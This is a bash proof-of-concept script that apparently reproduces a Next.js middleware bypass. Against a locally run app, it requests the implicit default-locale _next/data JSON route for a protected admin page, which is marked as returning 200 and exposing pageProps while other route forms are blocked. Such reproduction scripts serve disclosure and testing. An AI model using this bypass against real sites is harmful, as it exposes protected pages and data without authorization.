#!/usr/bin/env bash
set -euo pipefail

BASE_URL="http://127.0.0.1:3011"
APP_BASE="/corp"

if [ ! -f ".next/BUILD_ID" ]; then
  echo "[!] .next/BUILD_ID not found."
  echo "[i] Run first:"
  echo "    npm install"
  echo "    npm run build"
  echo "    npm run start"
  exit 1
fi

BUILD_ID="$(cat .next/BUILD_ID)"

echo
echo "===== Build ID ====="
echo "$BUILD_ID"

echo
echo "===== 1. Protected HTML route should be blocked by middleware ====="
curl -i -s "${BASE_URL}${APP_BASE}/base-admin" | sed -n '1,12p'

echo
echo "===== 2. Explicit default-locale HTML route should be blocked by middleware ====="
curl -i -s "${BASE_URL}${APP_BASE}/en/base-admin" | sed -n '1,12p'

echo
echo "===== 3. Explicit default-locale _next/data route should be blocked by middleware ====="
curl -i -s "${BASE_URL}${APP_BASE}/_next/data/${BUILD_ID}/en/base-admin.json" | sed -n '1,16p'

echo
echo "===== 4. Implicit default-locale _next/data route bypasses middleware ====="
curl -i -s "${BASE_URL}${APP_BASE}/_next/data/${BUILD_ID}/base-admin.json" | sed -n '1,40p'

echo
echo "===== 5. Non-default locale _next/data route should be blocked by middleware ====="
curl -i -s "${BASE_URL}${APP_BASE}/_next/data/${BUILD_ID}/it/base-admin.json" | sed -n '1,16p'

echo
echo "===== Expected vulnerable signal ====="
echo "The following request returns 200 OK and exposes pageProps JSON:"
echo "${BASE_URL}${APP_BASE}/_next/data/${BUILD_ID}/base-admin.json"
